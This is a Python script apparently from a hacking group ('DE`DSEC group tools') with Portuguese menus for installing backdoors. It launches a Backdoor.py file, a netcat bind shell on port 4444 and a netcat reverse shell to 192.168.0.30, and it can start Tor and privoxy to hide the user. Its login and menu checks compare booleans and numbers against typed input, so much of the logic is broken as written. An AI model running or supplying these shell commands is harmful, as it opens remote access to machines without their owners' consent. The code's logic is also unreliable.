import sys
import os
import socket
import re
#import requests
import time
import platform
import shutil
import traceback
import threading
import uuid
import StringIO
import zipfile
import tempfile
import getpass
from os import chdir, getcwd
import subprocess
from time import sleep

y = True
n = False
start = True
stop = False
number1 = 1
number2 = 2
number3 = 3
os.system("clear")

print    (" __________________________________________________________________")
print    ("|        ______  ________  ______  ________ ________________       |")
print    ("|       /  __  \/   ____/ /  __  \/    ___//   ____// ______\      |")
print    ("|      /  / /  /  ___/   /  / /  /\____  \/  ___/  / /	          |")
print    ("|     /  /_/  /  /_____ /  /_/  /_____/  /  /_____/ \_______       |")
print    ("|    /_______/________//_______//_______/________/\________/       |")
print    ("|   /_______/________//_______//_______/________/\________/        |")
print    ("|                                                                  |")
print    ("|        			>:DE`DSEC group tools                         |")
print    ("|                                                                  |")
print    ("|__________________________________________________________________|")
print    ("                                                                    ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

F0x = True
rootdedsecf0x = True

contaVerificaNome = input("Username : ")
contaVerificaPass = input("Password : ")
os.system("clear || cls")
if F0x == contaVerificaNome:
    if rootdedsecf0x == contaVerificaPass:
        print("[1] Usar Backdoor ? ")
        print("[2] Deseja entrar em anonimato ? ")
        if number1 == True:
            os.system("clear")
            print("[1] (Somente Linux) Instalar backdoor ? (PYTHON code) : ")
            print("[2] (Somente Linux) Instalar backdoor ? (Usa NetCat, conexao direta) : ")
            print("[3] (Somente Linux) Instalar backdoor ? (Usa NetCat, conexao reversa) : ")
            print("\n")
            install2 = input("Qual deseja usar ? ")
            if install2 == number1:
                install = input("Install backdoor ? (y/n) : ")
                if y == install:
                    #os.system("cd")
                    os.system("chmod +x Backdoor.py")
                    os.system("python Backdoor.py")

                        # if "cd " in data:
                        # 	os.chdir(data[3:].strip("\n"))

                        # if data[:2] == 'cd':
                        #    	try:
                        #        	chdir(data[3:])
                        #        	diretorio = getcwd()
                        #        	s.send(diretorio)
                        #        except:
                        #        	s.send("[-] Diretorio inexistente.")

            #            def dir(data)
            # diretorio = data
            #           		 try:
            #               		os.system("cd diretorio")
            #               	except
            #               		chdir("cd diretorio")
            #               	return diretorio

            # KEY_LENGTH = 2048
            # rand = Random.new().read
            # keypair = RSA.generate(KEY_LENGTH, rand)
            # decrypted = keypair.decrypt(data)
            # command_array = decrypted.split()

            # 		if command_array[0] == 'cd':
            # try:
            #    os.chdir(command_array[1])
            #    ciphertext = other_pub_key.encrypt('pwd: ' + os.getcwd(), 32)[0]
            #    sock.send(ciphertext + END_OF_OUTPUT)
            # except Exception as e:
            #    ciphertext = other_pub_key.encrypt(e.strerror, 32)[0]
            #    sock.send(ciphertext + END_OF_OUTPUT)

            if install2 == number2:
                install = input("Install backdoor ? (y/n)")

                if y == install:
                    #os.system("cd")
                    #os.system("chmod +x nc1.py")
                    #os.system("python nc1.py")
                    os.system("nc -lp 4444 -e /bin/sh")
                    

            if install2 == number3:
                os.system("clear")
                install = input("Install backdoor ? (y/n)")

                if y == install:
                    #os.system("cd")
                    #os.system("chmod +x nc2.py")
                    #os.system("python nc2.py")
                    os.system("nc 192.168.0.30 4444 -e /bin/sh")
        if number2 == True:
            inciarparar = input("[start/stop]")
            if inciarparar == start:
                os.system("service privoxy start")
                os.system("service tor start")
            if inciarparar == stop:
                os.system("service privoxy stop")
                os.system("service tor stop")



